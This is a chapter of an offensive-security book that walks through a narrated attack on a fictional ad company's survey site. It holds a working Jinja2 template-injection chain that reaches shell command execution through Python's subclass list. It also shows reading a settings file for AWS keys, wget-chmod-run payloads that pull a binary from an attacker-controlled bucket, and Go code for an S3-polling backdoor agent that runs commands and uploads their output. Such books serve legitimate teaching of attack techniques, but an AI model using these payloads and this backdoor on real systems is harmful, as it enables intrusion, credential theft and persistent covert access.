<html><head></head><body>
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="87" id="Page_87"/>6</span><br/>
<span class="ChapterTitle">Fracture</span></h1>
</header>
<figure class="opener">
<img src="image_fi/book_art/chapterart.png" alt=""/>
</figure>
<p class="ChapterIntro">From our work so far, we have a few MXR Ads credentials, and we’ve uncovered the main ways that MXR Ads and GP handle their infrastructure, but we’re not sure what to do with our findings. We still have so many opportunities to explore, so we go back to the drawing board: a handful of GP and MXR Ads websites that we confirmed in Chapter 4 (see Listing 4-3). In Chapter 5, we followed our gut by courting the most alluring assets, the S3 buckets, which eventually led us to a server-side request forgery (SSRF) vulnerability. But now we’ll abide by a steadier and more strenuous approach.</p>
<p>We will go through each website, follow each link, inspect every parameter, and even gather hidden links in JavaScript files using something like LinkFinder (<a href="https://github.com/GerbenJavado/LinkFinder/" class="LinkURL">https://github.com/GerbenJavado/LinkFinder/</a>). To do this we’ll inject carefully chosen special characters into forms and fields here and there until we trigger an anomaly, like an explicit database error, a 404 (Page Not Found) error, or an unexpected redirection to the main page.</p>
<p><span epub:type="pagebreak" title="88" id="Page_88"/>We’ll rely on Burp to capture all of the parameters surreptitiously sent to the server. This maneuver depends heavily on the web framework behind the website, the programming language, the operating system, and a few other factors, so to help streamline the process we will inject the following payload and compare the output to the application’s normal response:</p>
<pre><code>dddd",'|&amp;$;:`({{@&lt;%=ddd</code></pre>
<p>This string covers the most obvious occurrences of injection vulnerabilities for different frameworks: (No)SQL, system commands, templates, Lightweight Directory Access Protocol (LDAP), and pretty much any component using special characters to extend its query interface. The <code>dddd</code> part is like a label, some easy-to-spot text to help us visually locate the payload in the page’s response. A page that reacts even slightly unexpectedly to this string, like with an error page, a curious redirection, truncated output, or an input parameter reflected in the page in a weird way, is a promising lead worth investigating further. If the web page returns an innocuous response but seems to have transformed or filtered the input somehow, then we can probe further using more advanced payloads, like adding logical operators (<code>AND 1=0</code>), pointing to a real file location, trying a real command, and so on.</p>
<p>We begin injecting this payload into the forms on each site in our list. Soon enough, we reach the URL www.surveysandstats.com, the infamous website used to collect and probe data on people’s personalities, which we uncovered in Chapter 4. This has plenty of fields to inject our promiscuous string into. We enter it into a form, hit Submit, and are greeted with the delightful error page in <a href="#figure6-1" id="figureanchor6-1">Figure 6-1</a>.</p>
<figure>
<img src="image_fi/501263c06/f06001.png" alt="f06001"/>
<figcaption><p><a id="figure6-1">Figure 6-1</a>: <em>Surveysandstats.com</em> reacts to our string injection</p></figcaption>
</figure>
<p>Aha! That’s the kind of error that can make a hacker squirm with excitement. We turn to Burp and submit the form again, this time with perfectly innocent responses to the survey question with no special characters, just plain English, to make sure that the form normally works (see <a href="#figure6-2" id="figureanchor6-2">Figure 6-2</a>). When performing normally, the form should send us an email confirmation.</p>
<figure>
<img src="image_fi/501263c06/f06002.png" alt="f06002"/>
<figcaption><p><a id="figure6-2">Figure 6-2</a>: A regular form submission in Burp</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="89" id="Page_89"/>And sure enough, a couple of seconds later, we receive an email with the results of the survey (see <a href="#figure6-3" id="figureanchor6-3">Figure 6-3</a>).</p>
<figure>
<img src="image_fi/501263c06/f06003.png" alt="f06003"/>
<figcaption><p><a id="figure6-3">Figure 6-3</a>: Email reply from our normal survey submission</p></figcaption>
</figure>
<p>The survey is working just fine, which means it’s likely that it was indeed some special character in our payload that caused the page to crash the first time. To pin down which character, we replay the previous normal form entry, adding one special character from our payload at a time until we close in on the suspect: <code>{{</code> (the double braces). We may very well be dealing with a server-side template injection (SSTI) since templates often rely on double braces.</p>
<h2 id="h1-501263c06-0001">Server-Side Template Injection</h2>
<p class="BodyFirst">In many web development frameworks, templates are simple HTML files annotated with special variables that get replaced at runtime with dynamic values. Here are some of those special variables used in various frameworks:</p>
<pre><code># Ruby templates
&lt;p&gt;
&lt;%= @product %&gt;
&lt;/p&gt;
# Play templates (Scala/Java)
&lt;p&gt;
Congratulations on product @product
&lt;/p&gt;
# Jinja or Django templates
&lt;p&gt;
Congratulations on product {{product}}
&lt;/p&gt;</code></pre>
<p>This separation between the frontend of a web project (visualization in HTML/JavaScript) and the backend (controller or model in Python/Ruby/Java) is the cornerstone of many development frameworks and indeed many team organizations. The fun begins when the template itself is built dynamically using untrusted input. Take the following code, for instance. It produces a dynamic template using the <code>render_template_string</code> function, which is itself built using user input:</p>
<pre><code><var>--snip--</var>
template_str = """
    &lt;div&gt;
        &lt;h1&gt;hello&lt;/h1&gt;
<span epub:type="pagebreak" title="90" id="Page_90"/>        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
     """ % user_input

return render_template_string(template_str)</code></pre>
<p>In this Python snippet, if we were to inject a valid template directive like <code>{{8*2}}</code> in the <code>user_input</code> variable, it would be evaluated to 16 by the <code>render_template_string</code> method, meaning the page would display the result <code>16</code>. The tricky thing is that every template engine has its own syntax, so not all would evaluate it in this way. While some will let you read files and execute arbitrary code, others will not even let you perform simple multiplication.</p>
<p>That’s why our first order of business is to gather more information about this potential vulnerability. We need to figure out what language we are dealing with and which framework it is running.</p>
<h3 id="h2-501263c06-0001">Fingerprinting the Framework</h3>
<p class="BodyFirst">Since his presentation on SSTI at Black Hat USA 2015, James Kettle’s famous diagram depicting ways to fingerprint a templating framework has been ripped off in every article you may come across about this vulnerability, including here in <a href="#figure6-4" id="figureanchor6-4">Figure 6-4</a>. To explore how it works, we’ll enter a few different expressions in our survey form to see how they’re executed.</p>
<figure>
<img src="image_fi/501263c06/f06004.png" alt="f06004"/>
<figcaption><p><a id="figure6-4">Figure 6-4</a>: Different SSTI payloads to fingerprint the templating framework</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="91" id="Page_91"/>We send the payload <code>{{8 * '2'}}</code> and receive in response an email containing the string <code>2</code> repeated a total of eight times, as shown in <a href="#figure6-5" id="figureanchor6-5">Figure 6-5</a>. This behavior is typical of a Python interpreter, as opposed to a PHP environment, for example, which would have printed <code>16</code> instead:</p>
<pre><code># Payload
 
{{8*'2'}} # Python: 22222222, PHP: 16

{{8*2}} # Python: 16, PHP: 16</code></pre>
<figure>
<img src="image_fi/501263c06/f06005.png" alt="f06005"/>
<figcaption><p><a id="figure6-5">Figure 6-5</a>: Typical Python output for an input of <code>8 * '2'</code></p></figcaption>
</figure>
<p>From this we quickly come to the conclusion that we are probably dealing with the famous Jinja2 template used in Python environments. Jinja2 usually runs on one of two major web frameworks: Flask or Django. There was a time when a quick look at the “Server” HTTP response header would reveal which. Unfortunately, nobody exposes their Flask/Django application naked on the internet anymore. They instead go through Apache and Nginx servers or, in this case, an AWS load balancer that covers the original server directive.</p>
<p>Not to worry. There is a quick payload that works on both Flask and Django Jinja2 templates, and it’s a good one: <code>request.environ</code>. In both frameworks, this Python object holds information about the current request: HTTP method, headers, user data, and, most importantly, environment variables loaded by the app.</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user={{request.environ}}...</code></pre>
<p><a href="#figure6-6" id="figureanchor6-6">Figure 6-6</a> shows the response we get from this payload.</p>
<figure>
<img src="image_fi/501263c06/f06006.png" alt="f06006"/>
<figcaption><p><a id="figure6-6">Figure 6-6</a>: Response from <code>request.environ</code></p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="92" id="Page_92"/>Django literally appears in the <code>PYENV_DIR</code> path. Jackpot. The developers of this application seem to have decided to replace the default Django templating engine with the more powerful Jinja2 templating framework. This is lucky for us, because while Jinja2 supports a subset of Python expressions and operations that give it the edge in terms of performance and productivity, this flexibility comes at a steep price: we can manipulate Python objects, create lists, call functions, and even load modules in some cases.</p>
<h3 id="h2-501263c06-0002">Arbitrary Code Execution</h3>
<p class="BodyFirst">It’s almost tempting to jump ahead and attempt to access the password files with a payload like <code>{{os.open('/etc/passwd')}}</code>, but that would not work. The <code>os</code> object is not likely defined in the current context of the application. We can only interact with Python objects and methods defined in the page rendering the response. The <code>request</code> object we accessed earlier is automatically passed by Django to the template, so we can naturally retrieve it. The <code>os</code> module? Highly unlikely.</p>
<p>But, and it is a most fortunate <em>but</em>, most modern programming languages provide us with some degree of introspection and reflection—<em>reflection</em> being the ability of a program, object, or class to examine itself, including listing its own properties and methods, changing its internal state, and so on. This is a common feature of many high level languages like C#, Java, Swift—and Python is no exception. Any Python object contains attributes and pointers to its own class properties and those of its parents.</p>
<p>For instance, we can fetch the class of any Python object using the <code>__class__</code> attribute, which returns a valid Python object referencing this class:</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user=<code>{{request__class__ }}</code>...

&lt;class 'django.core.handlers.wsgi.WSGIRequest'&gt;</code></pre>
<p>That class is itself a child class of a higher Python object called <code>django.http.request.HttpRequest</code>. We did not even have to read the docs to find this out; it’s written in the object itself, inside the <code>__base__</code> variable, as we can see with this payload:</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user={{request.__class__.<code>__base__</code>}}...
&lt;class 'django.http.request.HttpRequest'&gt;

email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.<code>__base__</code>}}...
&lt;class 'object'&gt; <span class="CodeAnnotation" aria-label="annotation1">1</span></code></pre>
<p>We continue climbing the inheritance chain, adding <code>__base__</code> to the payload, until we reach the top-most Python object <span class="CodeAnnotation" aria-label="annotation1">1</span>, the parent of all <span epub:type="pagebreak" title="93" id="Page_93"/>classes: <code>object</code>. In and of itself, the <code>object</code> class is useless, but like all other classes, it contains references to its subclasses as well. So after climbing up the chain, it’s now time to go down using the <code>__subclasses__</code> method:</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__<code>.__subclasses__()</code>}}...

[&lt;class 'type'&gt;,
 &lt;class 'dict_values'&gt;,
 &lt;class 'django.core.handlers.wsgi.LimitedStream'&gt;,
 &lt;class 'urllib.request.OpenerDirector'&gt;,
 &lt;class '_frozen_importlib._ModuleLock'&gt;,
 &lt;class 'subprocess.Popen'&gt;,<code> </code><span class="CodeAnnotation" aria-label="annotation1">1</span>
<var>--snip--</var>
 &lt;class 'django.contrib.auth.models.AbstractUser.Meta'&gt;,
]</code></pre>
<p>More than 300 classes show up. These are all the classes inheriting directly from the <code>object</code> class and loaded by the current Python interpreter.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	In Python 3, all top classes are children of the <code>object</code> class. In Python 2, classes must explicitly inherit the <code>object</code> class.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>I hope you caught the <code>subprocess.Popen</code> class <span class="CodeAnnotation" aria-label="annotation1">1</span>! This is the class used to execute system commands. We can call that object right here, right now, by referencing its offset in the list of subclasses, which happens to be number 282 in this particular case (figured out with a manual count). We can capture the output of the <code>env</code> command using the <code>communicate</code> method:</p>
<pre><code># Payload
 
email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
<code>[282]("env", shell=True, stdout=-1).communicate()[0]</code>}}...

A couple of seconds later, we receive an email spilling out the environment variables of
the Python process running on the machine:
PWD=/opt/<code>django</code>/surveysapp
PYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c
KUBERNETES_SERVICE_PORT_HTTPS=443
HOME=/root
<var>--snip--</var></code></pre>
<p>We just achieved arbitrary code execution! Let’s see what we have of use. All Django settings are usually declared in a file called <em>settings.py</em> located at the root of the application. This file can contain anything from a simple declaration of the admin email to secret API keys. We know from the environment variables that the application’s full path is <em>/opt/Django/surveysapp</em>, and the <em>settings </em>file is usually one directory below that (with the same name). In <a href="#listing6-1" id="listinganchor6-1">Listing 6-1</a>, we try to access it.</p>
<span epub:type="pagebreak" title="94" id="Page_94"/>
<pre><code># Payload
 
email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
[282]("<code>cat /opt/Django/surveysapp/surveysapp/settings.py</code>", shell=True,
stdout=-1).communicate()[0]}}...

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SERVER_EMAIL = "no-replay@sureveysandstats.com"
SES_RO_ACCESSKEY = "AKIA44ZRK6WSSKDSKJPV" <span class="CodeAnnotation" aria-label="annotation1">1</span>
SES_RO_SECRETKEY = "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" <span class="CodeAnnotation" aria-label="annotation2">2</span>
<var>--snip--</var></code></pre>
<p class="CodeListingCaption"><a id="listing6-1">Listing 6-1</a>: Accessing the <em>surveysandstats.com</em> settings file</p>
<p>We get some credentials for SES <span class="CodeAnnotation" aria-label="annotation12">12</span> (Simple Email Service), an AWS-managed email service that provides an SMTP gateway, POP3 server, and so forth. This is totally expected, since the application’s main activity is to send email results to candidates.</p>
<p>These credentials will probably have a very narrow scope of action, like sending emails. We can try to be creative and phish some admins using this newly acquired capability, but right now, these credentials will serve a more pressing goal: confirming that <em>surveysandstats.com</em> indeed belongs to MXR Ads or is at least running in the same AWS environment before we spend any more time on it.</p>
<h3 id="h2-501263c06-0003">Confirming the Owner</h3>
<p class="BodyFirst">You might remember that we found the sketchy <em>surveysandstats.com</em> website while hunting for public notes on Gist and Pastebin in Chapter 4. For all we know, this could be an entirely separate organization unrelated to our true target. Let’s find out. First, we’ll try to get the account ID, which is one API call away and does not require any set of special permissions, so we can use the SES keys we just found. Every AWS IAM user by default has access to this information. In <a href="#listing6-2" id="listinganchor6-2">Listing 6-2</a>, we use the access key <span class="CodeAnnotation" aria-label="annotation1">1</span> and secret key <span class="CodeAnnotation" aria-label="annotation2">2</span> we got from <a href="#listing6-1">Listing 6-1</a> to grab the account ID.</p>
<pre><code>root@Point1:~/# <b>vi ~/.aws/credentials</b>
[ses]
aws_access_key_id = <b>AKIA44ZRK6WSSKDSKJPV</b>
aws_secret_access_key = <b>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</b>

root@Point1:~/# <b>aws sts get-caller-identity --profile ses</b>
{
  "UserId": "AIDA4XSWK3WS9K6IDDD0V",
  "Account": "886371554408",
  "Arn": "arn:aws:iam::886477354405:user/ses_ro_user"
}</code></pre>
<p class="CodeListingCaption"><a id="listing6-2">Listing 6-2</a>: Tracing the <em>surveysandstats</em><em>.com</em> account ID</p>
<p>Right on track: 886371554408 is the same AWS account ID we found for the MXR Ads demo application in Chapter 5. We are in business!</p>
<h2 id="h1-501263c06-0002"><span epub:type="pagebreak" title="95" id="Page_95"/>Smuggling Buckets</h2>
<p class="BodyFirst">Now, we want nothing more than to drop a reverse shell and quietly sip a cup of coffee while some post-exploit plug-in sifts through gigabytes of data looking for passwords, secrets, and other gems. But life doesn’t always cooperate.</p>
<p>When we try loading any file from the custom domain we created in Chapter 3 as part of our attacking infrastructure, the request never makes it home:</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
[282]("<code>wget https://linux-packets-archive.com/runccd; chmod +x runccd; ./runccd&amp;</code>", shell=True,
stdout=-1).communicate()[0]}}...

<var>&lt;empty&gt;</var></code></pre>
<p>Some sort of filter seems to block HTTP requests going to the outside world. Fair enough. We’ll try going in the opposite direction and query the metadata API 169.254.169.254. This default AWS endpoint helped us glean much information on the demo app in Chapter 5. Hopefully, it will give us more credentials to play with . . . or not:</p>
<pre><code># Payload

email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
[282]("<code>curl http://169.254.169.254/latest</code>", shell=True, stdout=-1).communicate()[0]}}...

<var>&lt;empty&gt;</var></code></pre>
<p>Unfortunately, every time we exploit this SSTI vulnerability, we’re triggering emails carrying the command’s output. Not exactly a stealthy attack vector. MXR Ads sure did a good job locking its egress traffic. Though this a common security recommendation, very few companies actually dare to implement traffic filtering systematically on its machines, mainly because it requires a heavy setup to handle a few legitimate edge cases, such as checking updates and downloading new packages. The mxrads-dl bucket we came across in Chapter 5 makes total sense now: it must act like a local repository mirroring all public packages needed by servers. Not an easy environment to maintain, but it pays off in situations like this one.</p>
<p>One question, though: how does MXR Ads explicitly allow traffic to the mxrads-dl bucket? Security groups (AWS Firewall rules) are layer 4 components that only understand IP addresses, which in the case of an S3 bucket may change, depending on many factors. So how can the <em>surveysandstats.com</em> website still reach the mxrads-dl bucket, yet fail to send packets to the rest of the internet?</p>
<p>One possible solution is to whitelist all of S3’s IP range in a given region, like 52.218.0.0/17, 54.231.128.0/19, and so on. However, this method is ugly, flaky at best, and barely gets the job done.</p>
<p><span epub:type="pagebreak" title="96" id="Page_96"/>A more scalable and cloud-friendly approach is to create an S3 VPC endpoint (see <a href="https://docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html" class="LinkURL">https://docs.aws.amazon.com/glue/latest/dg/vpc-endpoints-s3.html</a><em> </em>for details). It’s simpler than it sounds: a  <em>virtual private cloud</em> (VPC), is an isolated private network from which companies run their machines. It can be broken into many subnets, just like any regular router interface. AWS can plug a special endpoint URL into that VPC that will route traffic to its core services, like S3. Instead of going through the internet to reach S3, machines on that VPC will contact that special URL, which channels traffic through Amazon’s internal network to reach S3. That way, rather than whitelisting external IPs, one can simply whitelist the VPC’s internal range (10.0.0.0/8), thus avoiding any security issues.</p>
<p>The devil is in the details, though, as a VPC endpoint is only ever aware of the AWS service the machine is trying to reach. It does not care about the bucket or the file it is looking for. The bucket could even belong to another AWS account, and the traffic would still flow through the VPC endpoint to its destination! So technically, even though MXR Ads seemingly sealed off the survey app from the internet, we could still smuggle in a request to a bucket in our own AWS account and get the app to run a file we control. Let’s test this theory.</p>
<p>We’ll upload a dummy HTML file named <em>beaconTest.html</em> to one of our buckets and make it public by granting <code>GetObject</code> permission to everyone.</p>
<p>We first create a bucket called mxrads-archives-packets-linux:</p>
<pre><code>root@Point1:~/# <b>aws s3api create-bucket \</b>
<b>--bucket mxrads-archives-packets-linux \</b>
<b>--region=eu-west-1 \</b>
<b>--create-bucket-configuration \</b>
<b>LocationConstraint=eu-west-1</b></code></pre>
<p>Next, we upload a dummy file to our bucket and name it <em>beaconTest.html</em>:</p>
<pre><code>root@Point1:~/# <b>aws s3api put-object \</b>
<b>--bucket mxrads-archives-packets-linux \</b>
<b>--key beaconTest.html \</b>
<b>--body beaconTest.html</b></code></pre>
<p>We then make that file public:</p>
<pre><code>root@Point1:~/# <b>aws s3api put-bucket-policy \</b>
<b>--bucket mxrads-archives-packets-linux \</b>
<b>--policy file://&lt;(cat &lt;&lt;EOF</b>
<b>{</b>
<b>    "Id": "Policy1572645198872",</b>
<b>    "Version": "2012-10-17",</b>
<b>    "Statement": [</b>
<b>       {</b>
<b>         "Sid": "Stmt1572645197096",</b>
<b>         "Action": [</b>
<b>           "s3:GetObject", "s3:PutObject"</b>
<b>         ],</b>
<b>         "Effect": "Allow",</b>
<span epub:type="pagebreak" title="97" id="Page_97"/><b>         "Resource": "arn:aws:s3:::mxrads-archives-packets-linux/*",</b>
<b>         "Principal": "*"</b>
<b>        }</b>
<b>    ]</b>
<b>}</b>
<b>EOF)</b></code></pre>
<p>Finally, we proceed to fetch <em>beaconTest.html</em> through the <em>surveysandstats.com</em> website. If everything works as anticipated, we should get dummy HTML content back in response:</p>
<pre><code># Payload to the surveysandstats site form
 
email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
[282]("<code> curl https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/beaconTest.html</code>,
shell=True, stdout=-1).communicate()[0]}}...

# Results in email
&lt;html&gt;hello from beaconTest.html&lt;/html&gt;</code></pre>
<p>It was a long shot, but boy did it pay off! We’ve found a reliable way to communicate with the outside world from this otherwise sealed-off survey app. Using S3 files, we can now design a quasi-interactive protocol to execute code on this isolated machine.</p>
<h2 id="h1-501263c06-0003">Quality Backdoor Using S3</h2>
<p class="BodyFirst">We’ll develop an agent-operator system to easily execute code and retrieve the output on the surveysandstats<em> </em>machine. The first program on our server, known as the <em>operator</em>, will write commands to a file called <em>hello_req.txt</em>. A second program running on the survey site—the <em>agent</em>—will fetch <em>hello_req.txt</em> every couple of seconds, execute its contents, and upload the results to the file <em>hello_resp.txt</em> on S3. Our operator will routinely inspect this file and print its contents. This exchange is illustrated in <a href="#figure6-7" id="figureanchor6-7">Figure 6-7</a>.</p>
<figure>
<img src="image_fi/501263c06/f06007.png" alt="f06007"/>
<figcaption><p><a id="figure6-7">Figure 6-7</a>: Command execution through S3 files</p></figcaption>
</figure>
<p>The operator will have full access to the mxrads-archives-packets-linux bucket since it will be running on our own trusted server with the required <span epub:type="pagebreak" title="98" id="Page_98"/>AWS credentials. The agent only needs the <code>PutObject</code> permission on the <em>hello_resp.txt</em> file and <code>GetObject</code> on <em>hello_req.txt</em>. That way, even if an analyst ventures too close, they will only be able to take a peek at the last command sent, not the actual response.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	To satisfy our most stringent, sadistic, and paranoid reflexes, we could also add S3 lifecycle policies to automatically delete files after a few seconds (search for object lifecycle management at <a href="https://docs.aws.amazon.com/" class="LinkURL">https://docs.aws.amazon.com/</a>) and encrypt data using dynamic keys generated at runtime.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>I’ve made a basic implementation of the operator and agent available on GitHub at <a href="https://github.com/HackLikeAPornstar/GreschPolitico/tree/master/S3Backdoor/" class="LinkURL">https://github.com/HackLikeAPornstar/GreschPolitico/tree/master/S3Backdoor/</a><em> </em>if you would like to play with them, tweak them, and extend them with even more features. We will go through some of the highlights of the code in the following sections.</p>
<h3 id="h2-501263c06-0004">Creating the Agent</h3>
<p class="BodyFirst">As you may have noticed if you glanced at the repo, I decided to write the agent in Golang, because it’s fast, yields a statically linked executable, and is much more productive and friendlier than C/C++. The <code>main</code> function sets up the required variables, like the filenames and the HTTP connector, and then enters the main loop, as shown in <a href="#listing6-3" id="listinganchor6-3">Listing 6-3</a>.</p>
<pre><code>func main() {
  reqURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_req.txt", *bucket, *key)
  respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_resp.txt", *bucket, *key)

  client := &amp;http.Client{}</code></pre>
<p class="CodeListingCaption"><a id="listing6-3">Listing 6-3</a>: Setting up the agent variables</p>
<p>Our interactions with S3 will be through HTTP REST queries (GET for fetching content and PUT for uploading data) to avoid any weird permission overlap with the machine’s role. See this book’s resources at <a href="https://nostarch.com/how-hack-ghost/" class="LinkURL">https://nostarch.com/how-hack-ghost/</a> for the appropriate S3 policy to put in place.</p>
<p>In <a href="#listing6-4" id="listinganchor6-4">Listing 6-4</a>, we set the agent to download data to execute from the <code>reqURL</code> by executing the <code>fetchData</code> method every two seconds.</p>
<pre><code> for {
   time.Sleep(2 * time.Second)
   cmd, etag, err = fetchData(client, reqURL, etag)
<var>--snip--</var>
   go func() {
       output := execCmd(cmd)
       if len(output) &gt; 0 {
          uploadData(client, respURL, output)
       }
   }()
 }</code></pre>
<p class="CodeListingCaption"><a id="listing6-4">Listing 6-4</a>: Downloading the data</p>
<p><span epub:type="pagebreak" title="99" id="Page_99"/>If the file has been altered since the last visit (HTTP status code 200 indicates an alteration), then new commands are available for execution via the <code>execCmd</code> method. Otherwise, we receive an HTTP 304 (Not Modified) response and silently try again in a few seconds.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	I won’t go into ETag headers here, but if you want to know more, check out <a href="https://www.logicbig.com/" class="LinkURL">https://www.logicbig.com/</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Results are then sent back to the bucket (via the <code>uploadData</code> method). The next section, shown in <a href="#listing6-5" id="listinganchor6-5">Listing 6-5</a>, creates the <code>uploadData</code> method.</p>
<pre><code>func uploadData(client *http.Client, url string, data []byte) error {

 req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
 req.Header.Add("x-amz-acl", "bucket-owner-full-control")
 _, err = client.Do(req)
 return err
}</code></pre>
<p class="CodeListingCaption"><a id="listing6-5">Listing 6-5</a>: The <code>uploadData</code> method of the agent</p>
<p>The <code>uploadData</code> method is a classic HTTP PUT request, but here we have one small extra subtlety: the <code>x-amz-acl</code> header. This header instructs AWS to transfer ownership of the uploaded file to the destination bucket owner, which is us. Otherwise, the file would keep its original ownership and we wouldn’t be able to use the S3 API to retrieve it. If you’re curious about the anatomy of the functions <code>execCmd</code>, <code>fetchData</code>, and<code> uploadData</code>, do not hesitate to check out the code in the book’s GitHub repo.</p>
<p>The first crucial requirement in writing such an agent is stability. We will drop it behind enemy lines, so we need to properly handle all errors and edge cases. The wrong exception could crash the agent and, with it, our remote access. Who knows if the template injection vulnerability will still be there the next day?</p>
<p>Golang takes care of exceptions by not having them in the first place. Most calls return an error code that should be checked before moving forward. As long as we religiously follow this practice, along with a couple of other good coding practices like checking for nil pointers before dereferencing, we should be relatively safe. Second comes concurrency. We do not want to lose the program because it is busy running a <code>find</code> command that drains the agent’s resources for 20 minutes. That’s why we encapsulated the <code>execCmd</code> and <code>uploadData</code> methods in a goroutine (prefix <code>go func()</code>. . .).</p>
<p>Think of a goroutine as a set of instructions running in parallel to the rest of the code. All routines share the same thread as the main program, thus sparing a few data structures and the expensive context switching usually performed by the kernel when jumping from one thread to another. To give you a practical comparison, a goroutine allocates around 4KB of memory, whereas an OS thread roughly takes 1MB. You can easily run hundreds of thousands of goroutines on a regular computer without breaking a sweat.</p>
<p><span epub:type="pagebreak" title="100" id="Page_100"/>We compile the source code into an executable called <em>runcdd</em> and upload it to our S3 bucket where it will sit tight, ready to serve:</p>
<pre><code>root@Point1:~/# <b>git clone</b> <b>https://github.com/HackLikeAPornstar/GreschPolitico</b>
root@Point1:~/# <b>cd S3Backdoor/S3Agent</b>
root@Point1:~/# <b>go build -ldflags="-s -w" -o ./runcdd main.go</b>
root@Point1:~/# <b>aws s3api put-object \</b>
<b>--bucket mxrads-archives-packets-linux \</b>
<b>--key runcdd \</b>
<b>--body runcdd</b></code></pre>
<p>One of a few annoying things with Go is that it bloats the final binary with symbols, file paths, and other compromising data. We strip off some symbols with the <code>-s</code> flag and debug info with <code>-w</code>, but know that an analyst can dig up a good deal of information about the environment used to produce this executable.</p>
<h3 id="h2-501263c06-0005">Creating the Operator</h3>
<p class="BodyFirst">The operator part follows a very similar but reversed logic: it pushes commands and retrieves results while mimicking an interactive shell. You will find the code—in Python this time—in the same repository:</p>
<pre><code>root@Point1:~/S3Op/# <b>python main.py</b>
Starting a loop fetching results from S3 mxrads-archives-packets-linux
Queue in commands to be executed
shell&gt;</code></pre>
<p>We head over to our vulnerable form on <em>surveysandstats.com</em> and submit the following payload to download and run the agent:</p>
<pre><code># Payload to the surveysandstats site form

email=davidshaw@pokemail.net&amp;user={{request.__class__.__base__.__base__.__subclasses__()
[282]("<code>wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd %3B</code>
<code>chmod %2Bx runcdd %3B ./runcdd%26</code>, shell=True, stdout=-1).communicate()[0]}}...</code></pre>
<p>Decoded, the payload is multiple lines:</p>
<pre><code>wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd
chmod +x runcdd
./runcdd &amp;</code></pre>
<p>We then run the operator on our machine:</p>
<pre><code>root@Point1:~S3Fetcher/# <b>python main.py</b>
Starting a loop fetching results from S3 mxrads-archives-packets-linux

New target called home d5d380c41fa4
shell&gt; <b>id</b>
Will execute id when victim checks in

<span class="CodeAnnotationHang" aria-label="annotation1">1</span> uid=0(root) gid=0(root) groups=0(root)</code></pre>
<p><span epub:type="pagebreak" title="101" id="Page_101"/>That took some time, but we finally have a functioning shell <span class="CodeAnnotation" aria-label="annotation1">1</span> inside MXR Ads’ trusted environment. Let the fun begin.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="box">
<h2>The SSRF Alternative Method</h2>
<p class="BoxBodyFirst">We chose to go through an S3 bucket to bypass the network ban, but if you recall, we already met an application that was not subject to these restrictions: the demo application from Chapter 5. We could have perfectly leveraged the SSRF vulnerability we found earlier to design a quasi-duplex communication channel using the following steps:</p>
<ol>
<li value="1">We retrieve the demo app’s internal IP through the AWS metadata.</li>
<li value="2">We find the internal port used by the demo application. We run multiple <code>curl</code> queries from the survey site until we hit the real port used (3000, 5000, 8080, 8000, and so on).</li>
<li value="3">We write an agent program that continuously asks the demo application to screenshot our attacking server.</li>
<li value="4">Our operator waits for queries on the attacking server and serves the commands to run inside a decoy HTML page.</li>
<li value="5">The agent extracts the commands and sends back the response in a URL parameter, again through the demo application.</li>
<li value="6">The operator program receives the URL and prints the output.</li>
</ol>
<p>I preferred to focus on the S3 scenario because it is much more commonly available and will likely prove more helpful in real life.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h2 id="h1-501263c06-0004">Trying to Break Free</h2>
<p class="BodyFirst">We finally made it into a server inside one of MXR Ads’ coveted VPCs, and we have root access . . . or do we? Does anyone still run a production application as root nowadays? Chances are, we are actually just inside a container, and the user “root” in this namespace is mapped to some random unprivileged user ID on the host.</p>
<p>A quick way to corroborate our hypothesis is to look more closely at the process bearing the PID number 1: examine its command line attributes, cgroups, and mounted folders. We can explore these different attributes in the <em>/proc</em> folder—a virtual filesystem that stores information about processes, file handles, kernel options, and so on (see <a href="#listing6-6" id="listinganchor6-6">Listing 6-6</a>).</p>
<pre><code>shell&gt; <b>id</b>
uid=0(root) gid=0(root) groups=0(root)

shell&gt; <b>cat /proc/1/cmdline</b>
/bin/sh

shell&gt; <b>cat /proc/1/cgroup</b>
11:freezer:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541
<span epub:type="pagebreak" title="102" id="Page_102"/>10:blkio:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
